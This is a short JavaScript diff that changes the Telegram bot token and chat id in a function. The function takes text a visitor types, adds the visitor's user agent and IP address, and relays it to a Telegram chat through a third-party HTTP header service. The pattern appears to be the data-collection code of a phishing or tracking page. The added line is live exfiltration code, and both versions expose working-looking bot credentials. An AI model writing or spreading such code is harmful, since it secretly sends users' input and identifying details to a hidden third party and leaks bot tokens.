@@ -3,7 +3,7 @@ function ss(){
   var text = document.getElementById("inp").value;
   var mohtava = "ask%3A"+encodeURIComponent(text)+"%23"+encodeURIComponent(ua)+"%23"+ipp;
   var url = "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx";
-  var con = "https://api.telegram.org/bot2072567714:AAFpwTm_8eP43UR5BDUuuMKoFGVKan6WZcw/sendMessage?chat_id=-734718255&text="+mohtava;
+  var con = "https://api.telegram.org/bot7181515435:AAFNo62gE7hqassHCKmckFsxkz3lvasGtQU/sendMessage?chat_id=-1002666899819&text="+mohtava;
   var data={"UrlBox":con,
 "AgentList" : "Google Chrome",
 "VersionsList" : "HTTP/1.1",
